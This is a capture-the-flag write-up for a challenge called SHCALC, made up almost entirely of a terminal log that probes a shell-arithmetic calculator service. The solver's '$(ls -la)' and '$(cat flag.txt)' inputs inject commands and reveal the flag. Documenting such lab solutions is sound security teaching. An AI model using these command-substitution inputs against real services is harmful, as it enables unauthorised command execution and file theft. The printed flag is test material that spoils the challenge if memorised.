@@ -1,0 +1,136 @@
+# SHCALC
+
+### Solve
+
+```
+root@kali:~/Downloads#  nc shell.2019.nactf.com 31214
+shcalc v1.1
+> ls
+0
+> 1
+1
+> 2
+2
+> 3
+3
+> 4
+4
+> 5
+5
+> eval 
+0
+> help
+0
+> 1000000000000000000000000000000000000000000000000000000000
+9223372036854775807
+> 10000000000000000000000000000000000000000000000000000000000000000000000000000
+9223372036854775807
+> bash
+0
+> /bin/bash
+sh: 1: arithmetic expression: expecting primary: "/bin/bash"
+> ;la                   
+sh: 1: arithmetic expression: expecting primary: ";la"
+> ;ls
+sh: 1: arithmetic expression: expecting primary: ";ls"
+> $
+sh: 1: arithmetic expression: expecting primary: "$"
+> $?   
+0
+> $uname
+sh: 1: arithmetic expression: expecting primary: ""
+> python
+0
+> :shell
+sh: 1: arithmetic expression: expecting primary: ":shell"
+> 1 | ls
+1
+> ^[[A^[[D                                       "
+> : 1: arithmetic expression: expecting primary: "
+sh: 1: arithmetic expression: expecting primary: ""
+> 90 && ls
+0
+> pwd
+0
+> uname -a
+0
+> "
+sh: 1: arithmetic expression: expecting primary: """
+> \
+ls
+0
+> 
+sh: 1: arithmetic expression: expecting primary: ""
+> sh
+0
+> cat flag.txt
+sh: 1: arithmetic expression: expecting EOF: "cat flag.txt"
+> ; cat flag
+sh: 1: arithmetic expression: expecting primary: "; cat flag"
+> ;
+sh: 1: arithmetic expression: expecting primary: ";"
+> \"ls\"   
+sh: 1: arithmetic expression: expecting primary: ""ls""
+> ^C
+root@kali:~/Downloads# pnginfo insignificant_hawkeye.png 
+insignificant_hawkeye.png...
+  Image Width: 332 Image Length: 152
+  Bitdepth (Bits/Sample): 8
+  Channels (Samples/Pixel): 4
+  Pixel depth (Pixel Depth): 32
+  Colour Type (Photometric Interpretation): RGB with alpha channel 
+  Image filter: Single row per byte filter 
+  Interlacing: No interlacing 
+  Compression Scheme: Deflate method 8, 32k window
+  Resolution: 0, 0 (unit unknown)
+  FillOrder: msb-to-lsb
+  Byte Order: Network (Big Endian)
+  Number of text strings: 0
+
+root@kali:~/Downloads# nc shell.2019.nactf.com 31214
+
+shcalc v1.1
+> sh: 1: arithmetic expression: expecting primary: ""
+> exit
+0
+> -1
+-1
+> -100000000000000000000000000000000000000000000000000000000000
+-9223372036854775807
+> 1123
+1123
+> 001
+1
+> export
+0
+> ls     
+0
+> 
+sh: 1: arithmetic expression: expecting primary: ""
+> 1231 | ls
+1231
+> 123; ls
+sh: 1: arithmetic expression: expecting EOF: "123; ls"
+> flag
+0
+> 0; flag
+sh: 1: arithmetic expression: expecting EOF: "0; flag"
+> kill
+0
+> pwd
+0
+> ls=$(ls -la)
+sh: 1: arithmetic expression: expecting EOF: "ls=total 16
+drwxr-xr-x 1 root root 4096 Sep 13 05:38 .
+drwxr-xr-x 1 root root 4096 Sep 17 01:45 ..
+-rwxrwxrwx 1 root root  125 Sep 13 05:38 calc.sh
+-rw-r--r-- 1 root root   29 Sep 13 05:38 flag.txt"
+> flag=$(cat flag)
+cat: flag: No such file or directory
+sh: 1: arithmetic expression: expecting primary: "flag="
+> flag=$(cat flag.txt)
+sh: 1: arithmetic expression: expecting EOF: "flag=nactf{3v4l_1s_3v1l_dCf80yOo}"
+> $(cat flag.txt)
+sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
+
+```
